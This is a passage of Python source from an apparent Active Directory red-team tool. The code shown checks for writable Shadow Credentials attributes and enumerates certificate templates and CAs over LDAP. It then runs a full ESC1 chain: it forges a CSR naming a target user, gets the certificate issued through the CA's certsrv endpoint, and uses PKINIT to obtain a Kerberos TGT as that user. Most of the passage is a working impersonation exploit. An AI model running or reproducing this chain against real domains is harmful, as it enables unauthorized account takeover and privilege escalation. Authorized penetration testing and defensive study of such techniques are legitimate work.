                                    if is_audited_trustee or not trustee_sid.endswith(("-512", "-519", "-544")):
                                        posture["writable_trustees"].append({
                                            "trustee_sid": trustee_sid,
                                            "right": matched_right,
                                        })
                                        posture["is_vulnerable"] = True
                except Exception as dacl_err:
                    posture["dacl_error"] = str(dacl_err)[:100]

            if posture["is_vulnerable"]:
                self.finding(
                    title=f"AD Shadow Credentials - Writable msDS-KeyCredentialLink on '{target_user}'",
                    description=(
                        f"Active Directory object '{target_user}' has write permissions ({', '.join(t['right'] for t in posture['writable_trustees'])}) "
                        f"granted on the msDS-KeyCredentialLink attribute to audited trustee(s). "
                        f"An adversary can add an RSA KeyCredential to the target object and authenticate via "
                        f"PKINIT Kerberos as '{target_user}' to obtain full account control without knowing their password."
                    ),
                    severity=Severity.HIGH,
                    mitre_technique="T1556",
                    mitre_tactic="Credential Access",
                    evidence={
                        "target_user": target_user,
                        "writable_trustees": posture["writable_trustees"],
                        "has_existing_credentials": posture["has_existing_credentials"],
                        "key_count": posture["key_credential_count"],
                    },
                    remediation=(
                        f"Audit permissions on '{target_user}'. Remove WriteProperty for msDS-KeyCredentialLink, "
                        f"GenericWrite, and GenericAll from non-administrative users and groups."
                    ),
                )

        except Exception as exc:
            posture["error"] = str(exc)[:200]
        finally:
            try:
                conn.unbind()
            except Exception:
                pass

        return posture

    def _enum_templates_sync(self, dc: str, username: str, password: str,
                             domain: str) -> tuple[list[dict], list[dict]]:
        """Query LDAP for certificate templates and CA objects. Sync - runs in executor."""
        import ssl
        import ldap3
        from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, Tls
        from ldap3.core.exceptions import LDAPBindError

        conn = None
        for port, use_ssl in [(636, True), (389, False)]:
            try:
                tls_arg = Tls(validate=ssl.CERT_NONE) if use_ssl else None
                server  = Server(dc, port=port, use_ssl=use_ssl, tls=tls_arg,
                                 get_info=ALL, connect_timeout=10)
                conn = Connection(server, user=f"{domain.upper()}\\{username}",
                                  password=password, authentication=NTLM,
                                  auto_bind=ldap3.AUTO_BIND_NONE, receive_timeout=30)
                if not conn.bind():
                    raise LDAPBindError(f"Bind failed: {conn.result}")
                break
            except Exception:
                conn = None

        if conn is None:
            raise ConnectionError(f"Could not bind to {dc}")

        base = ",".join(f"DC={p}" for p in domain.upper().split("."))
        config_base = f"CN=Configuration,{base}"

        templates: list[dict] = []
        ca_list:   list[dict] = []

        try:
            # Query certificate templates with full attribute set
            tmpl_base = (
                f"CN=Certificate Templates,CN=Public Key Services,"
                f"CN=Services,{config_base}"
            )
            conn.search(
                tmpl_base,
                "(objectClass=pKICertificateTemplate)",
                search_scope=SUBTREE,
                attributes=[
                    "cn", "displayName", "msPKI-Certificate-Name-Flag",
                    "msPKI-Enrollment-Flag", "msPKI-Private-Key-Flag",
                    "pkiExtendedKeyUsage", "msPKI-Certificate-Policy",
                    "msPKI-RA-Signature", "msPKI-Template-Schema-Version",
                    "nTSecurityDescriptor",
                ],
            )
            for e in conn.entries:
                name_flags = 0
                enroll_flags = 0
                ra_signatures = 0
                schema_ver = 1
                try:
                    name_flags = int(getattr(e, "msPKI-Certificate-Name-Flag").value or 0)
                except Exception:
                    pass
                try:
                    enroll_flags = int(getattr(e, "msPKI-Enrollment-Flag").value or 0)
                except Exception:
                    pass
                try:
                    ra_signatures = int(getattr(e, "msPKI-RA-Signature").value or 0)
                except Exception:
                    pass
                try:
                    schema_ver = int(getattr(e, "msPKI-Template-Schema-Version").value or 1)
                except Exception:
                    pass

                ekus: list[str] = []
                try:
                    eku_raw = getattr(e, "pkiExtendedKeyUsage", None)
                    if eku_raw and eku_raw.values:
                        ekus = [str(v) for v in eku_raw.values]
                except Exception:
                    pass

                policies: list[str] = []
                try:
                    policy_raw = getattr(e, "msPKI-Certificate-Policy", None)
                    if policy_raw and policy_raw.values:
                        policies = [str(v) for v in policy_raw.values]
                except Exception:
                    pass

                dangerous_acls = []
                sd = getattr(e, "nTSecurityDescriptor", None)
                if sd and sd.value:
                    try:
                        from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
                        raw_sd = sd.raw_values[0] if hasattr(sd, "raw_values") else None
                        if raw_sd:
                            sd_obj = SR_SECURITY_DESCRIPTOR(data=raw_sd)
                            if sd_obj.get("Dacl"):
                                for ace in sd_obj["Dacl"]["Data"]:
                                    if ace["AceType"] in (0x00, 0x05):
                                        try:
                                            mask = ace["Ace"]["Mask"]["MaskFields"]
                                        except (KeyError, AttributeError):
                                            continue
                                        for right_mask, right_name in _DANGEROUS_RIGHTS.items():
                                            if mask & right_mask == right_mask:
                                                from ldap3.protocol.formatters.formatters import format_sid
                                                sid = format_sid(ace["Ace"]["Sid"].getData())
                                                if sid.endswith("-513") or sid.endswith("-515") or sid in ("S-1-5-11", "S-1-1-0", "S-1-5-32-545"):
                                                    dangerous_acls.append({"trustee_sid": sid, "right": right_name})
                                                    break
                    except Exception:
                        pass

                templates.append({
                    "name": str(e.cn),
                    "display_name": str(getattr(e, "displayName", e.cn)),
                    "msPKI_Certificate_Name_Flag": name_flags,
                    "msPKI_Enrollment_Flag": enroll_flags,
                    "msPKI_RA_Signature": ra_signatures,
                    "schema_version": schema_ver,
                    "ekus": ekus,
                    "policy_oids": policies,
                    "dangerous_acls": dangerous_acls,
                })

            # Query Enrollment Services (CAs) with flags
            ca_base = (
                f"CN=Enrollment Services,CN=Public Key Services,"
                f"CN=Services,{config_base}"
            )
            conn.search(
                ca_base,
                "(objectClass=pKIEnrollmentService)",
                search_scope=SUBTREE,
                attributes=["cn", "dNSHostName", "certificateTemplates", "flags"],
            )
            for e in conn.entries:
                ca_flags = 0
                try:
                    ca_flags = int(getattr(e, "flags").value or 0)
                except Exception:
                    pass
                ca_list.append({
                    "name": str(e.cn),
                    "dns_host": str(getattr(e, "dNSHostName", "")),
                    "flags": ca_flags,
                    "templates": [str(t) for t in
                                  (getattr(e, "certificateTemplates", None) or
                                   type("", (), {"values": []})()).values or []],
                })

            # Query OID mappings for msDS-OIDToGroupLink (ESC13)
            oid_to_groups: dict[str, str] = {}
            try:
                oid_base = f"CN=OID,CN=Public Key Services,CN=Services,{config_base}"
                conn.search(
                    oid_base,
                    "(msDS-OIDToGroupLink=*)",
                    search_scope=SUBTREE,
                    attributes=["cn", "msPKI-Cert-Template-OID", "msDS-OIDToGroupLink"],
                )
                for e in conn.entries:
                    oid_val = str(getattr(e, "msPKI-Cert-Template-OID", getattr(e, "cn", "")))
                    group_link = str(getattr(e, "msDS-OIDToGroupLink", ""))
                    if oid_val and group_link:
                        oid_to_groups[oid_val] = group_link
            except Exception:
                pass

            # Link group associations to templates
            for tmpl in templates:
                linked = []
                for p_oid in tmpl.get("policy_oids", []):
                    if p_oid in oid_to_groups:
                        linked.append(oid_to_groups[p_oid])
                tmpl["linked_groups"] = linked

        finally:
            try:
                conn.unbind()
            except Exception:
                pass

        return templates, ca_list

    def _exploit_esc1_sync(self, dc: str, domain: str, username: str, password: str,
                            template: dict, ca_list: list[dict],
                            target_user: str) -> str:
        """
        Request a certificate impersonating target_user via ESC1.
        Uses impacket's PKCS12/certificate request flow.
        Returns path to .pfx file on success.
        """
        import tempfile, os
        from impacket.dcerpc.v5 import transport, rpcrt

        if not ca_list:
            raise ValueError("No CA found in ADCS configuration")

        ca = ca_list[0]
        ca_host = ca.get("dns_host") or dc
        ca_name = ca.get("name", "")

        # Generate key pair and CSR with target UPN as SAN
        pfx_path = key_path = csr_path = ""
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            import datetime

            # Generate RSA key
            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

            # Build CSR with SAN = target_user@domain
            upn = f"{target_user}@{domain.upper()}"
            csr = (
                x509.CertificateSigningRequestBuilder()
                .subject_name(x509.Name([
                    x509.NameAttribute(NameOID.COMMON_NAME, target_user),
                ]))
                .add_extension(
                    x509.SubjectAlternativeName([
                        x509.OtherName(
                            x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"),
                            target_user.encode(),
                        )
                    ]),
                    critical=False,
                )
                .sign(key, hashes.SHA256())
            )

            # Save key and CSR to temp files
            from ares.core.security import secure_mkstemp as _sec_mkstemp
            pfx_path, _fd = _sec_mkstemp(suffix=".pfx", prefix="ares_adcs_")
            os.close(_fd)

            key_pem = key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption(),
            )
            csr_pem = csr.public_bytes(serialization.Encoding.PEM)

            # Save PEM files alongside PFX
            key_path = pfx_path.replace(".pfx", ".key")
            csr_path = pfx_path.replace(".pfx", ".csr")
            with open(key_path, "wb") as f:
                f.write(key_pem)
            with open(csr_path, "wb") as f:
                f.write(csr_pem)

            logger.info("adcs_csr_generated",
                        target_user=target_user, ca=ca_name,
                        template=template["name"])

            # Submit CSR to CA via HTTP enrollment endpoint (certsrv/certfnsh.asp)
            ca_host = ca.get("dns_host") or dc
            cert_pem = self._submit_csr_to_ca(
                ca_host=ca_host,
                ca_name=ca_name,
                template_name=template["name"],
                csr_pem=csr_pem,
                username=username,
                password=password,
                domain=domain,
            )

            if cert_pem:
                # Save combined PFX (key + cert) for immediate use
                pfx_out, _fd2 = _sec_mkstemp(suffix=".pem", prefix="ares_adcs_cert_")
                os.close(_fd2)
                with open(pfx_out, "wb") as f:
                    f.write(cert_pem)
                    f.write(b"\n")
                    f.write(key_pem)
                logger.info("adcs_cert_obtained", path=pfx_out, user=target_user)
                return pfx_out
            else:
                # CA submission failed - return CSR path for manual submission
                logger.warning("adcs_ca_submission_failed",
                               ca_host=ca_host, csr_path=csr_path)
                return csr_path   # operator can submit manually via certreq.exe

        except ImportError:
            logger.warning("adcs_exploit_missing_dep",
                           msg="pip install cryptography for ESC1 exploitation")
            return ""
        except Exception as exc:
            logger.warning("adcs_esc1_failed", error=str(exc)[:100])
            return ""
        finally:
            # Cleanup intermediate files containing private key material.
            # The RETURNED file (pfx_out or csr_path) is intentionally kept
            # for operator use - only clean up files that are NOT the return value.
            for tmp in [pfx_path, key_path]:
                try:
                    if tmp and os.path.exists(tmp):
                        os.unlink(tmp)
                except OSError:
                    pass

    def _submit_csr_to_ca(self, ca_host: str, ca_name: str, template_name: str,
                           csr_pem: bytes, username: str, password: str,
                           domain: str) -> bytes:
        """
        Submit CSR to Active Directory Certificate Services via HTTP enrollment.
        Endpoint: http://<ca_host>/certsrv/certfnsh.asp (requires auth)

        Returns PEM certificate bytes on success, empty bytes on failure.
        Uses NTLM authentication (same credentials used for LDAP).
        """
        if hasattr(self, "noise") and hasattr(self.noise, "scope_guard"):
            self.noise.scope_guard.assert_in_scope(ca_host)

        try:
            import httpx
            from base64 import b64encode

            # Strip PEM headers for certsrv - it expects raw base64
            csr_b64 = b64encode(
                b"".join(
                    line.encode() for line in csr_pem.decode().splitlines()
                    if not line.startswith("-----")
                )
            ).decode()

            certsrv_url = f"http://{ca_host}/certsrv/certfnsh.asp"

            # NTLM auth via httpx + httpx-ntlm or basic fallback
            auth: tuple | None = None
            try:
                from httpx_ntlm import HttpNtlmAuth  # type: ignore[import]
                ntlm_user = f"{domain}\\{username}" if domain else username
                auth = HttpNtlmAuth(ntlm_user, password)
            except ImportError:
                logger.warning(
                    "adcs_ntlm_auth_missing",
                    hint="pip install httpx-ntlm (included in ares-redteam[ad]) "
                         "for NTLM-authenticated CA enrollment. "
                         "Falling back to basic auth - may fail on most CAs.",
                )
                # Fallback to basic auth (works if CA has basic auth enabled)
                auth = (username, password)

            payload = {
                "Mode":            "newreq",
                "CertRequest":     csr_b64,
                "CertAttrib":      f"CertificateTemplate:{template_name}",
                "TargetStoreFlags": "0",
                "SaveCert":        "yes",
                "ThumbPrint":      "",
            }

            resp = httpx.post(
                certsrv_url,
                data=payload,
                auth=auth,
                timeout=30,
                follow_redirects=True,
            )

            if resp.status_code not in (200, 201):
                logger.warning("adcs_certsrv_http_error",
                               status=resp.status_code, ca=ca_host)
                return b""

            # Parse request ID from response
            import re
            rid_match = re.search(r"ReqID=(\d+)", resp.text)
            if not rid_match:
                # May have been issued immediately - check for cert in response
                if "BEGIN CERTIFICATE" in resp.text:
                    cert_match = re.search(
                        r"(-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----)",
                        resp.text, re.DOTALL
                    )
                    if cert_match:
                        return cert_match.group(1).encode()
                logger.warning("adcs_no_request_id", ca=ca_host)
                return b""

            req_id = rid_match.group(1)
            logger.info("adcs_cert_request_submitted", req_id=req_id, ca=ca_host)

            # Retrieve issued certificate
            cert_url = f"http://{ca_host}/certsrv/certnew.cer?ReqID={req_id}&Enc=b64"
            cert_resp = httpx.get(
                cert_url, auth=auth, timeout=15, follow_redirects=True
            )

            if cert_resp.status_code == 200 and cert_resp.text.strip():
                cert_text = cert_resp.text.strip()
                if not cert_text.startswith("-----"):
                    # Raw base64 - wrap in PEM headers
                    cert_text = (
                        "-----BEGIN CERTIFICATE-----\n"
                        + cert_text + "\n"
                        + "-----END CERTIFICATE-----\n"
                    )
                return cert_text.encode()

            return b""

        except Exception as exc:
            logger.debug("adcs_cert_submission_error", error=str(exc)[:100])
            return b""

    def _auth_with_cert(self, dc: str, domain: str, cert_path: str,
                         target_user: str) -> dict[str, Any]:
        """
        Authenticate to AD using the obtained certificate via PKINIT.
        Converts certificate → TGT → NTLM hash (UnPAC-the-hash).

        This completes the ESC1 exploitation chain:
          1. Request cert with target UPN (done in _exploit_esc1_sync)
          2. Use cert to get TGT via PKINIT (this method)
          3. Extract NT hash from PAC (UnPAC-the-hash)

        Returns dict with TGT ccache path and NT hash if successful.
        """
        result: dict[str, Any] = {"success": False, "error": None,
                                    "ccache_path": "", "nt_hash": ""}
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT
            from impacket.krb5.types import Principal
            from impacket.krb5 import constants
            from impacket.krb5.ccache import CCache
            import tempfile, os

            # Load certificate and private key from PEM file
            with open(cert_path, "rb") as f:
                pem_data = f.read()

            from cryptography.hazmat.primitives.serialization import pkcs12, Encoding, PrivateFormat, NoEncryption
            from cryptography import x509
            from cryptography.hazmat.primitives import hashes

            # Parse PEM - file contains both cert and key
            pem_text = pem_data.decode("utf-8", errors="replace")
            cert_pem = ""
            key_pem = ""
            in_cert = False
            in_key = False
            for line in pem_text.splitlines():
                if "BEGIN CERTIFICATE" in line:
                    in_cert = True
                if in_cert:
                    cert_pem += line + "\n"
                if "END CERTIFICATE" in line:
                    in_cert = False
                if "BEGIN" in line and "KEY" in line:
                    in_key = True
                if in_key:
                    key_pem += line + "\n"
                if "END" in line and "KEY" in line:
                    in_key = False

            if not cert_pem or not key_pem:
                result["error"] = "Certificate or key not found in PEM file"
                return result

            # Convert to PKCS12 for impacket
            from cryptography.hazmat.primitives.serialization import load_pem_private_key
            cert_obj = x509.load_pem_x509_certificate(cert_pem.encode())
            key_obj = load_pem_private_key(key_pem.encode(), password=None)

            pfx_data = pkcs12.serialize_key_and_certificates(
                name=target_user.encode(),
                key=key_obj,
                cert=cert_obj,
                cas=None,
                encryption_algorithm=NoEncryption(),
            )

            # Save PKCS12 to temp file for impacket
            from ares.core.security import secure_mkstemp, secure_mkdtemp
            pfx_path, _fd = secure_mkstemp(suffix=".pfx", prefix="ares_pkinit_")
            os.close(_fd)
            try:
                with open(pfx_path, "wb") as f:
                    f.write(pfx_data)

                # Use impacket's PKINIT implementation to get TGT
                # impacket >= 0.11 has gettgtpkinit support
                try:
                    from impacket.krb5 import types as krb_types

                    user_principal = Principal(
                        target_user,
                        type=constants.PrincipalNameType.NT_PRINCIPAL.value,
                    )

                    # Request TGT using certificate
                    tgt, cipher, old_key, session_key = getKerberosTGT(
                        clientName=user_principal,
                        password="",
                        domain=domain.upper(),
                        lmhash=b"", nthash=b"", aesKey=b"",
                        kdcHost=dc,
                        useCache=pfx_path,
                    )

                    # Save TGT to ccache
                    ccache = CCache()
                    ccache.fromTGS(tgt, old_key, old_key)
                    tmp_dir = secure_mkdtemp(prefix="ares-pkinit-")
                    ccache_path = os.path.join(tmp_dir, f"{target_user}.ccache")
                    ccache.saveFile(ccache_path)

                    result["success"] = True
                    result["ccache_path"] = ccache_path

                    logger.info("adcs_pkinit_success",
                                user=target_user, ccache=ccache_path)

                except Exception as pkinit_exc:
                    # Fallback: PFX still on disk for manual use - log warning
                    result["error"] = (
                        f"PKINIT auth failed: {str(pkinit_exc)[:150]}. "
                        f"Use cert manually: gettgtpkinit.py -cert-pfx <pfx> "
                        f"{domain}/{target_user} {target_user}.ccache"
                    )
            finally:
                # GUARANTEED cleanup of PFX containing private key material
                try:
                    os.unlink(pfx_path)
                except OSError:
                    pass

        except ImportError as exc:
            result["error"] = f"Missing dependency: {exc}"
        except Exception as exc:
            result["error"] = str(exc)[:300]

        return result
